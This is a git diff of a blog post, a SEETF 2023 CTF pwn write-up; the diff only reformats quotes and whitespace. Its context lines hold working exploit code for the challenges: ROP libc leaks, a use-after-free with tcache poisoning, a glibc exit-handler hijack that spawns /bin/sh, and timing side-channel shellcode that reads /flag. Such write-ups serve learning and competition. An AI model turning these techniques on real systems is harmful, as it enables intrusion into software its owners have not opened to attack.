@@ -1,14 +1,12 @@
 ---
-title: "SEETF 2023 Writeup"
-date: "2023-06-15"
+title: 'SEETF 2023 Writeup'
+date: '2023-06-15'
 tags: ['Writeup', 'Pwn']
 draft: false
-summary: "This weekend I participated in the SEETF 2023 event. The challenges are in good quality (two needs brute force). And I managed to solve a heap binary compiled with gilibc version 2.35 by abusing the exit handler since malloc_hook and free_hook are removed after 2.34."
+summary: 'This weekend I participated in the SEETF 2023 event. The challenges are in good quality (two needs brute force). And I managed to solve a heap binary compiled with gilibc version 2.35 by abusing the exit handler since malloc_hook and free_hook are removed after 2.34.'
 ---
 
 This weekend I participated in the SEETF 2023 event. The challenges are in good quality (two needs brute force). And I managed to solve a heap binary compiled with gilibc version 2.35 by abusing the exit handler since malloc_hook and free_hook are removed after 2.34.
-
-
 
 ## Pwn
 
@@ -67,7 +65,7 @@ def try_exploit(sh):
 
     ### Stage 1: leak libc address
     ### Condition: the input tale in main starts at 0xd0d0 1/8192
-    rop = ROP(binary) 
+    rop = ROP(binary)
 
     pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # this might vary based on the binary
     ret = rop.find_gadget(['ret'])[0]
@@ -151,26 +149,26 @@ The vulnerability is found by my teammate @Zeynarz and I followed up his work.
 There is an uninitialized variable vulnerability in create, update and delete function. Upon viewing the stack memory layout, we could found that:
 
 ```
-in update:             
+in update:
 0x7fffffffe00c = buffer_size
 0x7fffffffe010 = ptr
-                 
-in create:                  
+
+in create:
 0x7fffffffe00c = 0x5555
 0x7fffffffe010 = footer
-                                                                                                          
+
 in output:
 0x7fffffffe00c = buffer_size
 0x7fffffffe010 = ptr
 
-in delete:                                                
+in delete:
 0x7fffffffe00c = buffer_size
 0x7fffffffe010 = ptr
 ```
 
 However, this vulnerability can also be identified (hardly) by finding variables that can be uninitialized under some condition and then be used in the following code upon the source code level.
 
-So, we could get a UAF by `create(0)->delete(0)->update(-1)/output(-1)`.  By abusing this UAF, we could get arbitrary address read and writing through tcache poisoning.
+So, we could get a UAF by `create(0)->delete(0)->update(-1)/output(-1)`. By abusing this UAF, we could get arbitrary address read and writing through tcache poisoning.
 
 **abusing exit handler **
 
@@ -247,7 +245,7 @@ struct exit_function
       } cxa;
       } func;
   };
-  
+
 struct exit_function_list
   {
     struct exit_function_list *next;
@@ -272,7 +270,7 @@ The problem is that the function pointer has been encrypted by the following enc
 rol = lambda val, r_bits, max_bits: \
     (val << r_bits%max_bits) & (2**max_bits-1) | \
     ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
- 
+
 # Rotate right: 0b1001 --> 0b1100
 ror = lambda val, r_bits, max_bits: \
     ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
@@ -303,45 +301,45 @@ LIBCBASE = 0
 
 def create(size, content):
     global count
-    count += 1                              
+    count += 1
     sh.sendlineafter(b"5. [E]xit", b"C")
     sh.sendlineafter(b"What size?", str(size).encode())
     sh.sendlineafter(b"What content?", content)
 
     return count-1
-                             
-def output(idx, ignore=False): 
+
+def output(idx, ignore=False):
     sh.sendlineafter(b"5. [E]xit", b"O")
-    sh.sendlineafter(b"Which text? (0-9)",str(idx).encode())                                                                   
-    sh.recv()                                             
+    sh.sendlineafter(b"Which text? (0-9)",str(idx).encode())
+    sh.recv()
     return sh.recvuntil(b"1.")[:-2]
-                                                          
-def update(idx,content):                                  
+
+def update(idx,content):
     sh.sendlineafter(b"5. [E]xit", b"U")
     sh.sendlineafter(b"Which text? (0-9)",str(idx).encode())
-    sh.sendline(content)                                  
+    sh.sendline(content)
 
 def delete(idx):
     global count
     count -= 1
     sh.sendlineafter(b"5. [E]xit", b"D")
-    sh.sendlineafter(b"Which text? (0-9)",str(idx).encode())              
+    sh.sendlineafter(b"Which text? (0-9)",str(idx).encode())
 
 def mangle(pos, ptr):
     return p64((pos >> 12) ^ ptr)
-                             
+
 def demangle(obfus_ptr):
     o2 = (obfus_ptr >> 12) ^ obfus_ptr
     return (o2 >> 24) ^ o2
 
 def heap_leak():
     create(32,"abcd")
-    delete(0)                              
+    delete(0)
 
     # deobfuscation of the obfuscated pointer (which is just null)
-    heap_leak = u64(output(-1)[:5].ljust(8,b"\x00"))  
+    heap_leak = u64(output(-1)[:5].ljust(8,b"\x00"))
     heap_base = (heap_leak ^ 0) << 12
-    log.info(f"leak the heap base: {hex(heap_base)}") 
+    log.info(f"leak the heap base: {hex(heap_base)}")
 
     global HEAPBASE
     HEAPBASE = heap_base
@@ -355,7 +353,7 @@ def glibc_leak():
 
     glibc_base = u64(output(-1)[:6].ljust(8,b"\x00")) - 0x219ce0
     libc.address = glibc_base
-    log.info(f"leak the glibc base: {hex(glibc_base)}") 
+    log.info(f"leak the glibc base: {hex(glibc_base)}")
 
     ## clean it up
     create(0x500,"abcd") # make things easier by clearing out all free chunks
@@ -420,7 +418,7 @@ def exploit():
     binsh_addr = next(libc.search(b"/bin/sh"))
     log.info(f"leak the binsh addr: {hex(binsh_addr)}")
 
-    ### Step 2: leak the elf loading address 
+    ### Step 2: leak the elf loading address
     elf_ptr = LIBCBASE + 0x21AF48 # points to elf_base + 0x4008
     raw_elf_addr = arbitrary_addr_read(elf_ptr)[0x8:0x10]
     elf_base_addr = get_leaked_addr_raw(raw_elf_addr, 0) - 0x4008
@@ -448,7 +446,7 @@ def exploit():
     log.info(f"calculate the key: {hex(key)}")
     if (encrypt(cleanup_addr, key) == encrypted_cleanup):
         log.info("sanity check passed!")
-    
+
     # ### Step 4: overwrite the cleanup func with backdoor in exit_function_list
     payload = p64(0) + p64(2) + p64(4) + p64(encrypt(backdoor_addr, key))+p64(binsh_addr) + p64(0)
     log.info(f"encrypted backdoor: {hex(encrypt(backdoor_addr, key))}")
@@ -491,7 +489,7 @@ int main(int argc, char **argv, char **envp)
     scmp_filter_ctx ctx;
     ctx = seccomp_init(SCMP_ACT_KILL);
 
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);    
+    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
     assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
 
     assert(seccomp_load(ctx) == 0);
@@ -500,9 +498,9 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-Since I didn't responsible for solving this challenge during the game, so I just leave the idea here: 
+Since I didn't responsible for solving this challenge during the game, so I just leave the idea here:
 
-1. Leveraging the first 6 bytes to make a read `syscall` in order to read following payloads from stdin to the assigned memory region. 
+1. Leveraging the first 6 bytes to make a read `syscall` in order to read following payloads from stdin to the assigned memory region.
 2. Using the second stage payload to open and read the flag to the memory.
 3. Hold the memory address and check one bit of a byte each time. Check the response duration to find out the bit should be 0 or 1. (Looks like a side-channel brute force attack)
 
@@ -514,34 +512,34 @@ def gen_payload(i_byte, i_bit):
     filename = b'/flag'
     filename += b'\x00'*(8-len(filename))
     filename = struct.pack('Q',int.from_bytes(filename,'big'))
-    
+
     payload = asm("""
         push rdx
         pop rsi
         xor edi,edi
         syscall
     """, arch='x86_64', os='linux')
-    
+
     payload += b"\x90"*6
-    
-    payload += asm(f""" 
+
+    payload += asm(f"""
         mov rbx, 0x{filename.hex()}
         push rbx
         mov rdi, rsp
         mov rsi, 0
         mov rax, 0x2
         syscall
-    
+
         mov rdi, rax
         mov rsi, rsp
         mov rdx, 0x200
         mov rax, 0x0
         syscall
-    
+
         mov rax, [rsp+{i_byte}]
         and rax, {1<<i_bit}
         shr rax, {i_bit}
-        
+
         mov r11, 0x0
         imul rax, 0x10000000
         loop_start:
@@ -554,7 +552,7 @@ def gen_payload(i_byte, i_bit):
         loop_finished:
     """, arch='x86_64', os='linux')
     return payload
-    
+
 def get_bit(i_byte, i_bit):
 
     #conn = process('./chall')
